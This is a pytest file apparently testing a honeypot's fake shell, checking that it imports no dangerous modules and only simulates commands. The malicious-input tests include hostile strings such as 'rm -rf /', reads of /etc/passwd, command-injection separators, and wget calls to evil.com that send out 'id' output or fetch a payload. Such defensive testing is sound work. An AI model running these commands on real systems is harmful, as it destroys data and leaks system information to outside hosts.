"""Security tests for the fake shell."""
import inspect

import pytest

from honeypot.shell import FakeShell
from honeypot.session import Session


@pytest.fixture
def shell():
    session = Session(source_ip='127.0.0.1')
    return FakeShell(session)


class TestShellImports:
    """Verify the shell module does not import dangerous modules."""

    def test_no_subprocess(self):
        import honeypot.shell as mod
        source = inspect.getsource(mod)
        # Check for actual import statements
        assert 'import subprocess' not in source
        assert 'from subprocess' not in source
        # Verify no subprocess calls in code (ignore comments and docstrings)
        import ast
        tree = ast.parse(source)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    assert alias.name != 'subprocess', "subprocess imported"
            elif isinstance(node, ast.ImportFrom):
                assert node.module != 'subprocess', "subprocess imported"

    def test_no_os_system(self):
        import honeypot.shell as mod
        source = inspect.getsource(mod)
        # Filter out comments and docstrings for a stricter check
        lines = [l for l in source.split('\n') if not l.strip().startswith('#')
                 and '"""' not in l and "'''" not in l]
        code_only = '\n'.join(lines)
        assert 'os.system' not in code_only
        assert 'os.popen' not in code_only

    def test_no_os_import(self):
        import honeypot.shell as mod
        source = inspect.getsource(mod)
        assert 'import os' not in source

    def test_no_pathlib(self):
        import honeypot.shell as mod
        source = inspect.getsource(mod)
        assert 'import pathlib' not in source

    def test_no_network(self):
        import honeypot.shell as mod
        source = inspect.getsource(mod)
        # Filter out docstrings/comments
        lines = [l for l in source.split('\n') if not l.strip().startswith('#')
                 and '"""' not in l and "'''" not in l]
        code_only = '\n'.join(lines)
        assert 'socket' not in code_only
        assert 'urllib' not in code_only
        assert 'requests' not in code_only

    def test_no_open_calls(self):
        import honeypot.shell as mod
        source = inspect.getsource(mod)
        lines = [l for l in source.split('\n') if not l.strip().startswith('#')
                 and '"""' not in l and "'''" not in l]
        code_only = '\n'.join(lines)
        assert 'open(' not in code_only

    def test_no_eval_or_exec(self):
        import honeypot.shell as mod
        source = inspect.getsource(mod)
        lines = [l for l in source.split('\n') if not l.strip().startswith('#')
                 and '"""' not in l and "'''" not in l]
        code_only = '\n'.join(lines)
        assert 'eval(' not in code_only
        assert 'exec(' not in code_only

    def test_no_importlib(self):
        import honeypot.shell as mod
        source = inspect.getsource(mod)
        assert 'importlib' not in source


class TestCommandHandlersSafe:
    """Verify individual command handlers are safe."""

    def test_handlers_are_functions(self):
        from honeypot.shell import COMMAND_REGISTRY
        for name, handler in COMMAND_REGISTRY.items():
            assert callable(handler), f"Handler for {name} is not callable"

    def test_handlers_dont_raise_on_normal_input(self, shell):
        commands = [
            'ls', 'pwd', 'whoami', 'id', 'uname -a', 'hostname',
            'cat /etc/passwd', 'echo hello', 'env', 'ps', 'date',
            'grep root /etc/passwd', 'head /etc/passwd', 'wc /etc/passwd',
            'tree /home/user1', 'find /etc', 'stat /etc/passwd',
        ]
        for cmd in commands:
            output = shell.execute(cmd)
            assert isinstance(output, str)

    def test_handlers_dont_raise_on_malicious_input(self, shell):
        malicious = [
            'cat ../../../etc/passwd',
            'cat /etc/passwd; rm -rf /',
            'echo $(whoami)',
            'ls | cat /etc/passwd',
            'wget http://evil.com/$(id)',
            '; cat /etc/passwd',
            '&& cat /etc/passwd',
            '|| cat /etc/passwd',
            '\x00\x01\x02',
            'cat \x00/etc/passwd',
        ]
        for cmd in malicious:
            output = shell.execute(cmd)
            assert isinstance(output, str)


class TestNoRealCommandExecution:
    """Verify fake commands don't execute real system commands."""

    def test_ps_does_not_list_real_processes(self, shell):
        output = shell.execute('ps')
        # Fake ps should return simulated output, not real process list
        assert 'systemd' in output or 'user1' in output or 'PID' in output

    def test_wget_does_not_download(self, shell):
        output = shell.execute('wget http://evil.com/payload.sh')
        # Should not contain real download indicators
        assert 'saved' not in output.lower() or 'failed' in output.lower()

    def test_curl_does_not_fetch(self, shell):
        output = shell.execute('curl http://example.com')
        # Should be simulated
        assert output is not None

    def test_df_shows_fake_filesystems(self, shell):
        output = shell.execute('df')
        assert 'Filesystem' in output or 'tmpfs' in output or 'overlay' in output
